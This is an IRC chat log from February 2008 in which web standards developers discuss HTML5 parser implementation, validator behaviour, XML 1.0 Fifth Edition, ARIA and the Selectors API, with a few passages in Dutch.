which is not particularly impressive yet :-(

[05:35:00.0000] <annevk>
ah, you started with doing the treebuilding phase?

[05:36:00.0000] <Philip`>
I started with the tokeniser, and finished that months ago :-)

[05:45:00.0000] <annevk>
<ol> -> <ol> -> <dl> -> <dl> -> <dl> ...

[05:46:00.0000] <hsivonen>
gsnedders: do you cover multiple HTTP status lines? Wikipedia seems to send the status line twice

[05:47:00.0000] <zcorpan_>
hsivonen: isn't that just interpreted as an unknown/broken header?

[05:48:00.0000] <hsivonen>
zcorpan_: dunno

[05:48:01.0000] <hsivonen>
hmm. perhaps the debug features of Common HttpClient are broken--not Wikipedia

[05:48:02.0000] <hsivonen>
I can't reproduce the problem with telnet

[06:00:00.0000] <hsivonen>
too easy to make a system unresponsive by simply sending too much data to a browser :-(

[06:00:01.0000] <hsivonen>
I guess I have to limit the number of error messages V.nu reports

[06:01:00.0000] <Philip`>
Add a "show more errors" button which dynamically loads the next n error messages using XHR

[06:02:00.0000] <hsivonen>
Philip`: too complicated. I think I'll just cap the # of errors at a couple of thousand

[06:09:00.0000] <zcorpan_>
yeah, you'd have to validate again after fixing a bunch anyway

[06:10:00.0000] <zcorpan_>
1000 tests are more than enough to fix in one go

[06:10:01.0000] <zcorpan_>
s/tests/errors/

[06:11:00.0000] <annevk>
I ponder if I'd even bother with more than a 100

[06:12:00.0000] <zcorpan_>
it's likely simpler to rewrite from scratch

[06:13:00.0000] <Dashiva>
And you will no longer have the benefit of being able to "fix" hundreds of errors just with alt="" and />

[06:15:00.0000] <Philip`>
http://validator.nu/?doc=http://philip.html5.org/misc/quadratic.html

[06:20:00.0000] <Dashiva>
Error: The s element is obsolete. | At line 3, column 228 | p>x<p>x<p>x

[06:20:01.0000] <Dashiva>
Seems like the offset is off, somewhat

[06:21:00.0000] <hsivonen>
Dashiva: I think there's an implied <s> start there

[06:22:00.0000] <zcorpan_>
yep, it's reconstructing active formatting elements

[06:22:01.0000] <zcorpan_>
or whatever the algorithm is called

[06:24:00.0000] <zcorpan_>
http://parsetree.validator.nu/?doc=http%3A%2F%2Fphilip.html5.org%2Fmisc%2Fquadratic.html&submit=Print+Tree

[06:25:00.0000] <Dashiva>
Shouldn't the error be about implied elements instead, then?

[06:25:01.0000] <zcorpan_>
i guess the validation layer doesn't know which elements were implied

[06:26:00.0000] <hsivonen>
Dashiva: there are many "Error: Unclosed elements."

[06:26:01.0000] <Dashiva>
hsivonen: Then maybe there shouldn't be an error at all for the implied ones

[06:27:00.0000] <Dashiva>
It seems odd to error on <s>, error on unclosed, and then later create an additional error about an implied duplicate, after all both issues have been reported

[06:27:01.0000] <hsivonen>
Dashiva: like zcorpan_ said, the validation layer doesn't know which elements were implied. besides, the DOM conformance requirements don't discriminate between implied and explicit

[06:27:02.0000] <zcorpan_>
or it could perhaps figure it out by comparing the error with the sax event that carries location information (or how it's implemented)

[06:27:03.0000] <Philip`>
Safari seems to limit things by not cloning a node more than once

[06:28:00.0000] <hsivonen>
It's more likely that this issue isn't worth tweaking on the validation layer, because nodes getting cloned to this extent is rare in real content

[06:29:00.0000] <hsivonen>
which is why Safari can get away with its limit

[06:29:01.0000] <zcorpan_>
Philip`: that might be a good perf win

[06:30:00.0000] <Philip`>
It looks like a DOS vulnerability in the validator, since an attacker can do O(n) work to make the validator do O(n^2)

[06:32:00.0000] <hsivonen>
Philip`: yes. I'd prefer fixing this in the spec, though, instead of me putting arbitrary limits in the parser on my own

[06:33:00.0000] <zcorpan_>
and the validator isn't the only target

[06:34:00.0000] <hsivonen>
I think the biggest DoS attack vectors against the validator right now are user-provided regular expressions is schemas and user-provided XPath in schemas

[06:35:00.0000] <hsivonen>
s/is/in/

[07:48:00.0000] <gsnedders>
hsivonen: yeah, it'd just be a invalid header

[07:48:01.0000] <gsnedders>
/me did worse than he expected in the computing exam: only 68/80

[08:08:00.0000] <zcorpan_>
annevk: spam on your blog

[08:10:00.0000] <annevk>
:(

[08:10:01.0000] <annevk>
then again, "without" protection whatsoever it goes surprisingly well

[08:11:00.0000] <hsivonen>
annevk: is well-formedness the only protection?

[08:14:00.0000] <annevk>
forced preview and a static nonce too

[08:16:00.0000] <annevk>
i suppose that if someone really tries to target me i'm screwed

[08:16:01.0000] <annevk>
i'm not too worried though

[08:19:00.0000] <zcorpan_>
perhaps the forums need forced preview

[08:19:01.0000] <zcorpan_>
but i think most of not all spam on the forums are manually entered anyway

[08:19:02.0000] <zcorpan_>
s/of/if/

[08:20:00.0000] <zcorpan_>
or there's a way to register that doesn't involve the register form

[08:20:01.0000] <krijnh>
annevk: gezien dat ppk het over de IE8 switch gaat hebben vrijdag?

[08:21:00.0000] <annevk>
ja...

[08:21:01.0000] <annevk>
en ook dat het vol is!

[08:21:02.0000] <krijnh>
Juh :) 60 aanmeldingen

[08:21:03.0000] <annevk>
ik wilde het nog op m'n blog zetten om meer mensen uit te nodigen :)

[08:21:04.0000] <annevk>
ben ik nu dus te laat mee

[08:22:00.0000] <krijnh>
Sjah, kantine van Info is niet echt heel groot

[08:22:01.0000] <krijnh>
Lon komt ook btw

[08:22:02.0000] <annevk>
leuk

[08:22:03.0000] <annevk>
geen probleem trouwens, 60 is meer dan genoeg

[08:22:04.0000] <annevk>
moet ik wel m'n best doen :p

[08:22:05.0000] <zcorpan_>
hebben jullie en link of so?

[08:22:06.0000] <krijnh>
;)

[08:23:00.0000] <annevk>
zcorpan_, http://fronteers.nl/blog/2008/02/bijeenkomst-8-februari-is-vol

[08:23:01.0000] <zcorpan_>
s/en/een/

[08:23:02.0000] <krijnh>
Hehe

[08:23:03.0000] <annevk>
zcorpan_, en, "of zo"

[08:23:04.0000] <zcorpan_>
annevk: bedankt :)

[08:23:05.0000] <krijnh>
Wordt bijna tijd om de fixed positioning van dat rechtermenu weg te halen :\

[08:24:00.0000] <annevk>
misschien moet ik ook even wat vragen voorbereiden voor ppk :evil:

[08:24:01.0000] <krijnh>
Graag! :)

[08:27:00.0000] <krijnh>
Maar ik denk wel dat jij de enige browserbouwer bent daaro :)

[08:27:01.0000] <krijnh>
Dus hou een beetje rekening met het publiek

[08:27:02.0000] <krijnh>
Ow, btw, 50 aanmeldingen

[08:39:00.0000] <krijnh>
annevk: zet je je presentatie ook online op je site? Of op de site van Fronteers?

[09:29:00.0000] <anne_mibbit>
krijnh, my site, www-archive, fronteers, several places, dunno really

[09:29:01.0000] <anne_mibbit>
krijnh, it's not done yet though :)

[14:25:00.0000] <aseem>
hi all, I had a question about entity-ized charachters like & $ etc and the way the serializer processes the

[14:26:00.0000] <aseem>
it seems that other than &amp; all others - for e.g. &curren; &yen; &cent; etc get transformed to the unicode representations

[14:26:01.0000] <aseem>
I was wondering if there was any way to not make it do that

[14:27:00.0000] <aseem>
code to read and process html is :http://groups.google.com/group/html5lib-discuss/browse_thread/thread/c2209e63aae5585c

[14:27:01.0000] <aseem>
sorry not unicode representations I mean character representations


2008-02-06
[03:40:00.0000] <annevk>
http://www.phpied.com/wp-content/uploads/2008/02/canvas-pie.html is nice

[03:42:00.0000] <Hixie>
hard to argue against the .style in that

[03:46:00.0000] <annevk>
heh, i wasn't even thinking along those lines

[03:47:00.0000] <annevk>
just that it was a nice example of <canvas> usage that degrades pretty good to UAs that don't support <canvas> or non-visual UAs

[07:47:00.0000] <Philip`>
/me doesn't like how the parser spec uses "... and ...", "..., and ...", "..., and then ...", "..., then ..." for exactly equivalent sentences in different places

[07:48:00.0000] <Philip`>
So far I've got /Act as if an? (start|end) tag (?:token )?with the tag name "(\S+)" (?:and no attributes )?had been seen(?:, and then|, and| and|, then) reprocess the current token\./ to handle all the variations I've seen

[07:48:01.0000] <gsnedders>
Philip`: I don't think that's in the en-gb-x-Hixie spec, better complain to the editor

[07:49:00.0000] <Philip`>
I guess the language was designed for humans, which makes it harder for me :-(

[07:49:01.0000] <zcorpan_>
Philip`: since you're inhuman?

[07:50:00.0000] <annevk>
heh, you're actually trying to generate code from the English text? :)

[07:50:01.0000] <Philip`>
zcorpan_: No, but I'm trying to create an inhuman :-)

[07:52:00.0000] <Philip`>
annevk: It seems to be working alright so far - mostly it's a big table of English->code, but there are lots of repeated and nearly-repeated phrases so it saves a lot of code writing

[07:52:01.0000] <Philip`>
and I can be fairly surely it precisely matches the spec, including when the spec changes in the future, which is good since I'm lazy and don't want to have to check it carefully :-)

[07:53:00.0000] <annevk>
i guess you should comment on the inconsistencies

[07:54:00.0000] <Philip`>
I could add a code->English translation function, to rewrite that section of the spec with no inconsistencies :-)

[08:00:00.0000] <zcorpan_>
we should define how Hixie English should be parsed

[08:00:01.0000] <gsnedders>
is http://ian.hixie.ch/bible/english not the place for that?

[08:01:00.0000] <zcorpan_>
yes but it's very incomplete

[08:01:01.0000] <gsnedders>
en-gb-x-hixie 5?

[08:02:00.0000] <Philip`>
/me wonders if it's sane to convert all the "generic R?CDATA parsing algorithm" bits into separate new insertion modes, so he can get rid of the bits where it needs to wait for the next token

[08:02:01.0000] <annevk>
heh

[08:02:02.0000] <Philip`>
...and the skip-next-token-if-it's-a-newline bit too

[08:02:03.0000] <annevk>
the /TR/ version actually uses <html lang=en-US-x-Hixie>

[08:02:04.0000] <Philip`>
/me hopes there aren't any other such places

[08:02:05.0000] <gsnedders>
annevk: US!?

[08:02:06.0000] <annevk>
and the WHATWG version has en-GB-Hixie

[08:03:00.0000] <gsnedders>
so the /TR version is in an unspecified language. yuk.

[08:05:00.0000] <annevk>
en-US-x-Hixie is more correct than en-GB-Hixie

[08:05:01.0000] <gsnedders>
annevk: "more correct" makes no sense.

[08:05:02.0000] <gsnedders>
correctness is a binary value, you are either correct or you are not

[08:05:03.0000] <gsnedders>
annevk: but why?

[08:05:04.0000] <Philip`>
The English words "abort", "about", "above", "accepting", ... "youngest", "your" are to be interpreted as described in the Oxford English Dictionary [OED].

[08:06:00.0000] <Ketsuban>
You forgot "sausage".

[08:06:01.0000] <Ketsuban>
/me promptly apologises for the Blackadder reference.

[08:08:00.0000] <zcorpan_>
gsnedders: hixie english is both en-GB-x-Hixie and en-US-x-Hixie

[08:08:01.0000] <zcorpan_>
gsnedders: en-GB-hixie and en-US-hixie are the old tags

[08:08:02.0000] <gsnedders>
zcorpan_: but there's no spec for en-us-[x-]hixie! :P

[08:09:00.0000] <gsnedders>
hmm, en-us-hixie is mentioned once in it

[08:09:01.0000] <zcorpan_>
point that out to Hixie :P

[08:09:02.0000] <gsnedders>
and not even with an -x :P

[08:10:00.0000] <gsnedders>
/me notes you need an en-gb-x-hixie parser to parse the en-gb-x-hixie spec

[08:11:00.0000] <Philip`>
You need an HTML parser to parse the HTML spec too

[08:11:01.0000] <gsnedders>
yeah, I know that.

[08:12:00.0000] <Ketsuban>
gsnedders: a standard en-GB parser is sufficient.

[08:12:01.0000] <gsnedders>
Ketsuban: most people have some variant of en-gb, though

[08:14:00.0000] <Ketsuban>
True. Language codes don't take into account idiolects (excepting of course en-GB-x-Hixie).

[08:56:00.0000] <Philip`>
Hooray, now my parser does <title> and implies <html> and <head> and <body> etc, and I think it might even do that correctly

[08:57:00.0000] <annevk>
we should change handling of <title> and </head> in HTML5 though

[08:57:01.0000] <Philip`>
If that can be done by copying-and-pasting text from other sections, then I'll be happy since I won't have to do anything

[08:59:00.0000] <annevk>
i guess it comes down to </head> being ignored but only being a parse error sometimes and <title> being treated like a normal element except for its content model

[09:22:00.0000] <Philip`>
/me wishes he could use the tree construction tests without first having to work out how to glue his tokeniser and tree-constructor together

[09:24:00.0000] <Philip`>
...and fortunately I can, since I can just use some other tokeniser to convert the tests so they give the token stream instead of the source text

[09:25:00.0000] <Philip`>
...but unfortunately I don't have a JSON parser in OCaml

[10:00:00.0000] <kig>
there is a json parser for ocaml, json-static or whatever it was

[10:01:00.0000] <kig>
(or at least there's one in our work repo)

[10:18:00.0000] <Philip`>
kig: Ah, thanks - json-static looks a bit scary with camlp4, but json-wheel looks like it ought to work without pain

[12:22:00.0000] <gsnedders>
<http://www.w3.org/TR/2008/PER-xml-20080205/> — PER of Fifth Edition of XML 1.0

[12:24:00.0000] <Philip`>
XML 1.0 5?

[12:25:00.0000] <AwayEagle>
That's purely editorial, I imagine?

[12:25:01.0000] <gsnedders>
AwayEagle: no, it isn't

[12:25:02.0000] <Philip`>
No

[12:25:03.0000] <Philip`>
http://recycledknowledge.blogspot.com/2008/02/justice-at-last-part-two.html

[12:27:00.0000] <gsnedders>
so _that's_ what that change is all about

[12:33:00.0000] <AwayEagle>
interesting. Doesn't XML NS specify QName, etc., grammar in terms of unicode categories anyway?

[12:33:01.0000] <gsnedders>
AwayEagle: depends whether you look at NS for XML 1.0 or NS for XML 1.1

[12:34:00.0000] <AwayEagle>
gsnedders: sounds like I looked at the wrong one then :-)

[12:34:01.0000] <gsnedders>
AwayEagle: NS for XML 1.0 will have to be revised, FWIW

[12:35:00.0000] <gsnedders>
actually, it won't

[12:35:01.0000] <gsnedders>
actually, yes it will.

[12:35:02.0000] <gsnedders>
it refers to stuff in appendix B in XML 1.0

[15:48:00.0000] <Philip`>
/me starts passing a few tests


2008-02-07
[16:27:00.0000] <Hixie>
Philip`: the text of the spec was written very much stream of consciousness. if we had the data, you could probably see a pattern as to when i use "... and ...", and "..., then ...", etc, based on who last talked to me, who I last replied to in e-mail, when I woke up, what i ate for lunch, or something :-)

[16:28:00.0000] <jgraham_>
/me imagines the spec rewritten in the style of Ulysses 

[16:28:01.0000] <jgraham_>
Although that should perhaps be styles

[16:28:02.0000] <jgraham_>
"styles", even

[16:55:00.0000] <Philip`>
/me wonders why lots of tests are failing, and then realises it's the head/body-implication thing where the spec disagrees with the tests

[17:03:00.0000] <Philip`>
Does someone happen to know how this ought to work?

[17:03:01.0000] <Hixie>
i really should fix that

[17:03:02.0000] <Hixie>
gah, so many things to fix

[17:03:03.0000] <Dashiva>
Speaking of implications. Whitespace nodes are sometimes processed as if the parser was in a different mode (e.g. in head noscript counts as in head"

[17:03:04.0000] <Dashiva>
Does this also normalize them if there's an existing one before or after already?

[17:03:05.0000] <Philip`>
(By "lots of tests", I mean 4 out of the 9 before I get a not-yet-implemented exception)

[17:03:06.0000] <Dashiva>
It says appending several characters means making them a single node, but it doesn't have specific mention of what happens when an append crosses phases

[17:20:00.0000] <Philip`>
Yay, now I pass 9 out of 9 tests before dying

[01:16:00.0000] <zcorpan_>
oooh

[01:16:01.0000] <zcorpan_>
xml 1.0 5th edition

[01:16:02.0000] <zcorpan_>
first step towards xml5?

[01:20:00.0000] <zcorpan_>
"XML 1.0 documents SHOULD NOT specify a version number other than '1.0'."

[01:21:00.0000] <zcorpan_>
seems they have made the version pseudo-attribute meaningless

[01:21:01.0000] <zcorpan_>
which is good

[01:32:00.0000] <zcorpan_>
wonder if they can be convinced to say that "XML 1.0 documents SHOULD NOT contain a DOCTYPE declaration."

[01:32:01.0000] <zcorpan_>
(or must not)

[01:33:00.0000] <annevk>
Philip`, when you hit EOF and you haven't created <head> yet, do that, etc., up until <body>

[01:45:00.0000] <Philip`>
I've done something like

[01:45:01.0000] <Philip`>
 BeforeHead: (EndOfFile, [ActAsIfStartTag "head"; ReprocessCurrentToken])

[01:45:02.0000] <Philip`>
 InHead: (EndOfFile, [ActAsIfEndTag "head"; ReprocessCurrentToken])

[01:45:03.0000] <Philip`>
 AfterHead: (EndOfFile, [ActAsIfStartTag "body"; ReprocessCurrentToken])

[01:45:04.0000] <Philip`>
 Every other mode: same for EndOfFile as what the spec says

[01:45:05.0000] <Philip`>
which hopefully covers the necessary cases

[01:47:00.0000] <annevk>
i think html5lib has something like that

[02:57:00.0000] <jgraham_mibbit>
zcorpan_: What's the status of aria in HTML 5? Are we just planning to import all the aria properties as aria-*

[03:00:00.0000] <zcorpan_>
jgraham: think so

[03:00:01.0000] <zcorpan_>
the aria spec now requires only aria-*

[03:02:00.0000] <jgraham_mibbit>
That's the Member only WD, right?

[03:25:00.0000] <gsnedders>
zcorpan_: yeah, I think it's a good first step, though

[03:25:01.0000] <gsnedders>
/me realises how awesome school is: he is in secondary 5!

[03:42:00.0000] <zcorpan_>
jgraham_: no, a fpwd was published the other day

[03:42:01.0000] <zcorpan_>
jgraham_mibbit: http://www.w3.org/TR/wai-aria/

[03:51:00.0000] <jgraham_mibbit>
zcorpan_: Thanks

[03:52:00.0000] <jgraham_mibbit>
/me wonders how aria properties are supposed to interact with html-native properties (e.g. <td aria-labelledby="foo" headers="baz">

[03:52:01.0000] <jgraham_mibbit>
)

[03:54:00.0000] <zcorpan_>
jgraham: i wonder that too

[03:55:00.0000] <zcorpan_>
i'm planning to go through each and every aria role and question its existance in the first place and furthermore how it interacts with native features in host languages

[03:56:00.0000] <jgraham_mibbit>
zcorpan_: That sounds very worthwhile. 

[03:59:00.0000] <jgraham_mibbit>
(and something that I would be interested in working on)

[03:59:01.0000] <zcorpan_>
feel free :)

[04:01:00.0000] <zcorpan_>
i think that the host language should be able to say whether a role applies or not

[04:01:01.0000] <zcorpan_>
e.g. role=heading might make sense in svg but not in html

[04:04:00.0000] <annevk2>
why oh why did I reply to Dmitry Turin

[04:05:00.0000] <hsivonen>
do we have some kind of support for SVG diagrams in the mediawiki instance on wiki.whatwg.org?

[04:05:01.0000] <zcorpan_>
annevk2: your ignore flag isn't working properly

[04:12:00.0000] <annevk2>
:)

[04:12:01.0000] <annevk2>
this was my last reply

[05:27:00.0000] <zcorpan_>
hmm there's no spec for window.scrollTo and friends

[05:27:01.0000] <annevk2>
if you can propose definitions I'm willing to put them where they belong

[05:27:02.0000] <annevk2>
(cssom-view)

[05:28:00.0000] <zcorpan_>
i have to figure out which should throw when

[05:28:01.0000] <zcorpan_>
s/when/and when/

[05:30:00.0000] <annevk>
is there a non-multipage shortcut for the WHATWG draft of HTML5?

[05:35:00.0000] <zcorpan_>
don't think so

[05:37:00.0000] <Philip`>
http://whatwg.org/html5/../ unfortunately doesn't work

[05:40:00.0000] <annevk>
http://html5.org/spec

[05:51:00.0000] <Philip`>
/me keeps getting mixed up between Ocaml's "!=" and "<>" operators

[05:51:01.0000] <Philip`>
which is annoying because it makes my code fail in ways that take me ages to discover :-(

[05:52:00.0000] <Philip`>
(!= and == do physical equality, = and <> do structural equality, so "x" = "x" and "x" != "x")

[06:20:00.0000] <Philip`>
/me notes that e.g. the "reconstruct the active formatting elements" algorithm does not map trivially into a functional language

[06:56:00.0000] <Philip`>
"1. Let node be the element immediately prior to node in the stack of open elements.  2. If node is not in the list of active formatting elements, then remove node from the stack of open elements and then go back to step 1."

[06:57:00.0000] <Philip`>
If node is removed from the stack of open elements, then there is no longer any element immediately prior to it in the stack of open elements

[06:57:01.0000] <Philip`>
or am I misunderstanding something?

[06:58:00.0000] <Dashiva>
node seems overloaded

[06:58:01.0000] <annevk>
the stack of open elements always has the root node

[06:59:00.0000] <annevk>
which can't be popped iirc

[06:59:01.0000] <annevk>
/me forgot the details

[07:00:00.0000] <Philip`>
But 'node' can be not the root node, and once it's removed from the stack then you can't find an element prior to 'node' in the stack

[07:00:01.0000] <annevk>
?

[07:00:02.0000] <Philip`>
Like, what comes before node 'x' in the list [a; b; c; d]?

[07:01:00.0000] <Philip`>
Once 'x' has been removed from the list, that doesn't make sense any more

[07:02:00.0000] <annevk>
good point, which algorithm is this?

[07:03:00.0000] <Philip`>
Adoption agency

[07:03:01.0000] <Philip`>
though I don't know of many real adoption agencies that clone children

[07:04:00.0000] <annevk>
I think "node" and "node" in the first sentence are distinct

[07:07:00.0000] <annevk>
so that one of those "node" thingies is still around when you delete the other

[07:08:00.0000] <Philip`>
/me wishes the terms 'lower' and 'prior' and 'after' and 'furthest' and 'last' and 'end' and 'start' and 'bottom' weren't all mixed up for similar concepts

[07:09:00.0000] <annevk>
node = self.tree.openElements[

[07:09:01.0000] <annevk>
  self.tree.openElements.index(node)-1]

[07:09:02.0000] <annevk>
  while node not in self.tree.activeFormattingElements:

[07:09:03.0000] <annevk>
    tmpNode = node

[07:09:04.0000] <annevk>
    node = self.tree.openElements[self.tree.openElements.index(node)-1]

[07:09:05.0000] <annevk>
    self.tree.openElements.remove(tmpNode)

[07:10:00.0000] <annevk>
with better indentation is the html5lib impl of those two steps

[07:10:01.0000] <Philip`>
That's setting node to the element prior to node, before removing node

[07:10:02.0000] <Philip`>
which is the opposite order to what the spec says

[07:13:00.0000] <annevk>
i guess the spec needs to be clarified then

[07:13:01.0000] <Philip`>
/me will probably email something once he's worked out what's meant to be going on in the algorithm

[07:16:00.0000] <annevk>
bugs :(

[08:49:00.0000] <annevk>
gsnedders, someone else pointed out the changes I needed to make for ABNF fancyness

[08:50:00.0000] <gsnedders>
annevk: ah, so I need not do anything?

[08:52:00.0000] <annevk>
right, though you may review

[08:52:01.0000] <annevk>
and maybe answer a question

[08:52:02.0000] <annevk>
does ABNF do #rule ?

[08:52:03.0000] <gsnedders>
# being a number? yes

[08:52:04.0000] <annevk>
HTTP #rule

[08:53:00.0000] <gsnedders>
meaning what?

[08:53:01.0000] <gsnedders>
/me is slightly confused now

[08:56:00.0000] <annevk>
a comma-seperated list

[08:59:00.0000] <Philip`>
/me sees that the 'has an element in scope' algorithm deceptively is used in two quite different ways, one checking for a specific element and one checking for any element with a name in a given set

[09:07:00.0000] <Philip`>
/me wonders if anyone knows of a bug where Firefox on Linux shifts a random set of characters up or down by one codepoint

[09:07:01.0000] <gavin>
/me doesn't

[09:07:02.0000] <gavin>
sounds nasty!

[09:07:03.0000] <Philip`>
like changing all spaces into "!"s, or changing the world "element" into "dldmdnt"

[09:08:00.0000] <Philip`>
s/world/word/

[09:08:01.0000] <gsnedders>
annevk: what's the original that you're trying to go from?

[09:08:02.0000] <Philip`>
I just saw it happen to someone, but he fixed it by restarting the browser

[09:10:00.0000] <annevk>
gsnedders, http://dev.w3.org/2006/waf/access-control/#access-control0

[09:10:01.0000] <gsnedders>
annevk: that doesn't make sense in the original if it should be comma-seperated, off the top of my head

[09:12:00.0000] <gsnedders>
annevk: rule *("," *LWS rules) — I think that would do

[09:12:01.0000] <annevk>
the idea is to :allow <*>, deny <*>, allow <*>

[09:12:02.0000] <gsnedders>
s/rules/rule/

[09:12:03.0000] <annevk>
do you need *LWS ?

[09:12:04.0000] <annevk>
/me thought LWS was already multiple

[09:13:00.0000] <gsnedders>
I have no idea. In RFC2616?

[09:13:01.0000] <gsnedders>
IIRC no

[09:13:02.0000] <gsnedders>
RFC2616 seems to use *LWS a lot

[09:14:00.0000] <gsnedders>
LWS = [CRLF] 1*( SP | HT )

[09:14:01.0000] <gsnedders>
and it's implicit *LWS that's allowed in HTTP

[09:15:00.0000] <gsnedders>
RFC2616's BNF seems to have implicit commas, but ABNF doesn't

[09:15:01.0000] <gsnedders>
annevk: rule *(*LWS "," *LWS rule)

[09:16:00.0000] <gsnedders>
*LWS rule *(*LWS "," *LWS rule)

[09:16:01.0000] <gsnedders>
that's the equivalent

[09:16:02.0000] <annevk>
holy crap

[09:16:03.0000] <gsnedders>
RFC2616's BNF is made to make HTTP easy to spec in BNF

[09:17:00.0000] <gsnedders>
in most cases you don't want implicit comma separated lists

[09:17:01.0000] <annevk>
maybe I should use RFC2616 BNF

[09:17:02.0000] <gsnedders>
2616bis may move to ABNF too, so maybe we get that there :)

[09:17:03.0000] <annevk>
as it's about HTTP after all

[09:18:00.0000] <annevk>
and i don't want it to be vastly different from HTTP

[09:18:01.0000] <annevk>
oh well, got to run

[09:18:02.0000] <gsnedders>
me too

[09:39:00.0000] <Philip`>
/me gives in and writes an imperative function

[10:05:00.0000] <Philip`>
/me gets half of the adoption agency algorithm to type-check

[10:28:00.0000] <Philip`>
So, I hope steps 6-8 are equivalent to: Remove all items from open-stack between furthest-block and formatting-element that are not in active-list. Set bookmark to be after the first element in that open-stack range that is also in active-list. Fold all the elements in that range into a tree, with some cloning, then fold that into common-ancestor.

[12:11:00.0000] <annevk>
http://norman.walsh.name/2008/02/07/xml105e

[12:14:00.0000] <hsivonen>
I suppose I should find time to write a comment to the effect of too little too late and causes uncertainty and interop problems to the very people it is supposed to help

[13:03:00.0000] <Lachy>
XML1 5th ed. sounds ok. Although I haven't read the spec, I assume new documents written that contain previously forbidden characters will fail well formedness checks in older parsers.

[13:03:01.0000] <Lachy>
I don't see that as a major problem, but there will be a significant transitional period

[13:59:00.0000] <gsnedders>
Lachy: your assumption is correct

[13:59:01.0000] <gsnedders>
Lachy: I doubt it'll take wrong, basically change 1.1 mode into 1.x mode

[14:07:00.0000] <jgraham_>
gsnedders: The relevant timescale is not the time to implement but the time for existing deployments to be updated

[14:07:01.0000] <jgraham_>
(asumming you meant s/wrong/long/)

[14:11:00.0000] <Philip`>
It'll be fun for people who try to be careful and do well-formedness checks before passing user-provided data into some backend system 

[14:28:00.0000] <gsnedders>
jgraham_: yeah, I did

[14:28:01.0000] <gsnedders>
I'm too tired to typ

[14:28:02.0000] <gsnedders>
*type

[14:32:00.0000] <sayrer>
I have a way to work around the XHR issues that Microsoft has

[14:32:01.0000] <sayrer>
new XMLHttpRequest('<meta http-equiv="X-UA-Compatible" content="IE=8" />')

[14:32:02.0000] <sayrer>
that will trigger their compatibility mode

[14:33:00.0000] <Philip`>
Uh, how is that meant to work?

[14:34:00.0000] <sayrer>
perfectly!

[14:35:00.0000] <Philip`>
Oh, okay

[14:35:01.0000] <Philip`>
By what mechanism is that meant to work perfectly?

[14:35:02.0000] <sayrer>
AJAX

[14:36:00.0000] <Philip`>
*confused* :-(

[14:37:00.0000] <Philip`>
I still think Microsoft should run a database of all web pages to say what IE-compatibility mode they should be rendered with

[14:38:00.0000] <Philip`>
They've already got the right infrastructure from the phishing filter

[14:40:00.0000] <jgraham_>
Philip`: Given much of the problem is with intranet pages...

[14:53:00.0000] <annevk>
sayrer :)

[15:10:00.0000] <Philip`>
/me 's adoption agency appears to run forever

[15:12:00.0000] <annevk>
infinite childs

[15:14:00.0000] <takkaria>
not too unlike real life, then

[15:17:00.0000] <annevk>
pfff

[15:17:01.0000] <annevk>
i don't quite get this accountability thread

[15:21:00.0000] <annevk>
-> bed

[15:22:00.0000] <jgraham_>
Philip`: I think the html5lib adoption agency encountered a spec bug at first but it was fixed iirc

[15:39:00.0000] <Lachy>
nice. WebKit adds support for selectors api http://webkit.org/blog/156/queryselector-and-queryselectorall/

[15:42:00.0000] <othermaciej>
oh yeah we should have mentioned that sooner

[15:42:01.0000] <othermaciej>
weinig had some comments about the spec actually but I don't think he submitted them to the webapi list

[15:42:02.0000] <othermaciej>
/me glares at weinig 

[15:44:00.0000] <othermaciej>
Lachy: I think his particular comment was that being able to preflight a selector as one the engine could handle might be more convenient for JS libraries that would wrap this than the exception on syntax error

[15:44:01.0000] <othermaciej>
Lachy: since browser selector support may be variable, and libraries would want to fill in the holes

[15:45:00.0000] <aroben>
othermaciej: I think it didn't get announced until we passed the css3.info selector test

[15:45:01.0000] <aroben>
othermaciej: for exactly the reason of not wanting to be less capable than the JS libraries

[15:46:00.0000] <aroben>
othermaciej: since they don't have an easy way of know what we support

[15:46:01.0000] <aroben>
knowing

[15:46:02.0000] <othermaciej>
aroben: many JS libraries support nonstandard extensions to Selectors anyway

[15:46:03.0000] <aroben>
othermaciej: oh?

[15:47:00.0000] <othermaciej>
yeah

[15:47:01.0000] <othermaciej>
so either way they'll want to dispatch to a native implementation only conditionally

[15:47:02.0000] <othermaciej>
but I actually thing try/catch might be an ok way to achieve that

[15:49:00.0000] <aroben>
othermaciej: yeah, it's not so bad

[15:51:00.0000] <Philip`>
/me tries running through the adoption agency manually, and finds that it still loops infinitely...


2008-02-08
[16:10:00.0000] <Philip`>
"insert the clone into the stack of open elements immediately after (i.e. in a more deeply nested position than) the position of the furthest block in that stack."

[16:10:01.0000] <Philip`>
Hmm, I think I read that bit backwards

[16:11:00.0000] <Philip`>
/me really doesn't like the terminology for list/stack positions in here :-(

[16:11:01.0000] <Philip`>
(particularly since my implementation stores all the lists backwards)

[17:04:00.0000] <Lachy>
othermaciej, which particular comment were you referring to about preflighting a selector?

[17:04:01.0000] <othermaciej>
Lachy: I wasn't referring to a particular comment

[17:04:02.0000] <othermaciej>
or rather, I was referring to a comment that weinig (who worked on our selectors API stuff some) made privately to me

[17:04:03.0000] <Lachy>
oh, but you said "I think his particular comment..."

[17:05:00.0000] <Lachy>
ok

[17:07:00.0000] <Lachy>
othermaciej, I'm not quite sure I understand what the comment means though. Are you saying the exception are a good thing for web developers or not?

[17:08:00.0000] <othermaciej>
Lachy: his particular hypothetical comment that he would have made

[17:09:00.0000] <Lachy>
what?

[17:09:01.0000] <Lachy>
/me is confused

[17:10:00.0000] <Lachy>
probably because I'm tired

[17:13:00.0000] <Lachy>
oh, I think I understand now after reading the comments properly

[17:14:00.0000] <othermaciej>
sorry

[17:14:01.0000] <othermaciej>
to try to be totally clear:

[17:14:02.0000] <othermaciej>
1) Someone I work with gave me some feedback privately

[17:14:03.0000] <othermaciej>
2) I asked him to send it to the list, but he hasn't yet

[17:14:04.0000] <othermaciej>
3) I gave you a general outline of the nature of his comment

[17:16:00.0000] <Lachy>
it was suggested to me earlier that I remove exceptions, and instead just return an empty list.

[17:16:01.0000] <Lachy>
but if exceptions are to be used as a way to switch back to a scripted implementation in the event that the browser doesn't support a selector natively, then that's a good reason to keep them

[17:18:00.0000] <Lachy>
but there will be some changes to the spec in the way non-DOMString return values are handled from NSResolvers. The value will just be stringified, instead of ignored (or whatever the spec says now)

[17:18:01.0000] <othermaciej>
right, what I was thinking was that a separate call to check if a given query syntax is supported might be a better way to do that

[17:18:02.0000] <othermaciej>
but not sure

[17:20:00.0000] <Lachy>
something like document.isSelectorSupported("some %hypothetcial>selector-syntax"); ?

[17:22:00.0000] <othermaciej>
yeah

[17:23:00.0000] <Lachy>
maybe that might be better. There are some people who really hate exceptions

[17:23:01.0000] <othermaciej>
